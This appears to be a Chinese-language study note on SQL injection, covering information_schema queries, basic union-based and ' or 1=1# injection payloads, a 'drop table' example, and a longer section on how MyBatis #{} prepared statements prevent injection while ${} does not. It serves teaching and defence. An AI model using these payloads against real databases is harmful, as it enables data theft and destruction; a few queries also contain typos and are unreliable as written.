---
title: SQL注入
categories:
- 系统安全
---
%27表示 单引号
可以将需要加引号的部分转成hes十六进制。

###数据库系统表介绍
>schemata -> 数据库信息
    schema_name    数据库名称
    查询所有数据库名：SELECT group_concat(schema_name) from information_schema.schema;

>tables -> 数据库和表的关系
    schema_name    数据库
    table_name    表名
    查询数据库中的所有表名：SELECT group_concat(table_name) from informat_schema.tables where table_schema='security';

>columns  -> 表和列的关系
    column_name    列名
    table_name    表名
    查询表中的所有字段名：SELECT group_concat(column_name) from information_schema.columns where table_name='users';

###基础sql注入攻击
**参数类型是数字**
获取当前数据库名称，发送请求参数如下进行注入：
id=-1 union select database()

获取所有数据库名称
id=-1 union select group_concat(schema_name) from information_schema.schemata

查询数据库中的所有表
id=-1 union select group_concat(table_name) from informat_schema.tables where table_schema=security

通过获取的数据库名，查询表中的信息
id=-1 union select username,password from database;

用于验证账号密码是否存在
select * from users where username=? and password=?;
经过sql注入后
select * from users where username='' or 1=1#' and password=md5('') ;
可以查询表中的所有数据。


**参数类型是字符串**
id=-1' union select id,name,password from security --+     最终放入sql语句时会在参数中添加两个单引号，需要在参数中添加单引号与第一个单引号进行配对，然后注释掉后面的内容，--是注释符，+最终会解析为空格符。



**判断表字段数**
SELECT * FROM menu ORDER BY 3;
表示按第三行进行排序，如果第三行不存在会报错。


###复杂的sql攻击注入
基于时间的盲注
布尔类型的盲注
Double Query
请求头注入
INSERT/UPDATE 注入
报错注入


###1、mybatis中的#和$的区别

1、#将传入的数据都当成一个字符串，会对自动传入的数据加一个双引号。
如：where username=#{username}，如果传入的值是111,那么解析成sql时的值为where username="111", 如果传入的值是id，则解析成的sql为where username="id".　
2、$将传入的数据直接显示生成在sql中。
如：where username=${username}，如果传入的值是111,那么解析成sql时的值为where username=111；
如果传入的值是;drop table user;，则解析成的sql为：select id, username, password, role from user where username=;drop table user;
3、#方式能够很大程度防止sql注入，$方式无法防止Sql注入。
4、$方式一般用于传入数据库对象，例如传入表名.
5、一般能用#的就别用$，若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止sql注入攻击。
6、在MyBatis中，“\${xxx}”这样格式的参数会直接参与SQL编译，从而不能避免注入攻击。但涉及到动态表名和列名时，只能使用“\${xxx}”这样的参数格式。所以，这样的参数需要我们在代码中手工进行处理来防止注入。
【结论】在编写MyBatis的映射语句时，尽量采用“#{xxx}”这样的格式。若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止SQL注入攻击。

### 2、什么是sql注入

　　[ sql注入解释](https://en.wikipedia.org/wiki/SQL_injection)：是一种代码注入技术，用于攻击数据驱动的应用，恶意的SQL语句被插入到执行的实体字段中（例如，为了转储数据库内容给攻击者）

**　　SQL****注入**，大家都不陌生，是一种常见的攻击方式。**攻击者**在界面的表单信息或URL上输入一些奇怪的SQL片段（例如“or ‘1’=’1’”这样的语句），有可能入侵**参数检验不足**的应用程序。所以，在我们的应用中需要做一些工作，来防备这样的攻击方式。在一些安全性要求很高的应用中（比如银行软件），经常使用将**SQL****语句**全部替换为**存储过程**这样的方式，来防止SQL注入。这当然是**一种很安全的方式**，但我们平时开发中，可能不需要这种死板的方式。



### mybatis是如何做到防止sql注入的

　　[MyBatis](https://mybatis.github.io/mybatis-3/)框架作为一款半自动化的持久层框架，其SQL语句都要我们自己手动编写，这个时候当然需要防止SQL注入。其实，MyBatis的SQL是一个具有“**输入+输出**”的功能，类似于函数的结构，参考上面的两个例子。其中，parameterType表示了输入的参数类型，resultType表示了输出的参数类型。回应上文，如果我们想防止SQL注入，理所当然地要在输入参数上下功夫。上面代码中使用#的即输入参数在SQL中拼接的部分，传入参数后，打印出执行的SQL语句，会看到SQL是这样的：
select id, username, password, role from user where username=? and password=?
　　不管输入什么参数，打印出的SQL都是这样的。这是因为MyBatis启用了预编译功能，在SQL执行前，会先将上面的SQL发送给数据库进行编译；执行时，直接使用编译好的SQL，替换占位符“?”就可以了。因为SQL注入只能对编译过程起作用，所以这样的方式就很好地避免了SQL注入的问题。

**mybatis是如何实现预编译的**
mybatis 默认情况下，将对所有的 sql 进行预编译。mybatis底层使用PreparedStatement，过程是先将带有占位符（即”?”）的sql模板发送至mysql服务器，由服务器对此无参数的sql进行编译后，将编译结果缓存，然后直接执行带有真实参数的sql。核心是通过#{ } 实现的。
在预编译之前，#{ } 解析为一个 JDBC 预编译语句（prepared statement）的参数标记符?。
```sql
//sqlMap 中如下的 sql 语句
select * from user where name = #{name};
//解析成为预编译语句
select * from user where name = ?;
```
```sql
//如果${ }，SQL 解析阶段将会进行变量替换。不能实现预编译。
select * from user where name = '${name}'
//传递的参数为 "ruhua" 时,解析为如下，然后发送数据库服务器进行编译。
select * from user where name = "ruhua";
```


### 结论
\#{}：相当于JDBC中的PreparedStatement
①预编译阶段可以优化 sql 的执行
预编译之后的 sql 多数情况下可以直接执行，DBMS 不需要再次编译，越复杂的sql，编译的复杂度将越大，预编译阶段可以合并多次操作为一个操作。可以提升性能。
②防止SQL注入
使用预编译，而其后注入的参数将不会再进行SQL编译。也就是说其后注入进来的参数系统将不会认为它会是一条SQL语句，而默认其是一个参数，参数中的or或者and 等就不是SQL语法保留字了。

\${}：是输出变量的值
\#{}是经过预编译的，是安全的；\${}是未经过预编译的，仅仅是取变量的值，是非安全的，存在SQL注入。
如果我们order by语句后用了\${}，那么不做任何处理的时候是存在SQL注入危险的。你说怎么防止，那我只能悲惨的告诉你，你得手动处理过滤一下输入的内容。如判断一下输入的参数的长度是否正常（注入语句一般很长），更精确的过滤则可以查询一下输入的参数是否在预期的参数集合中。
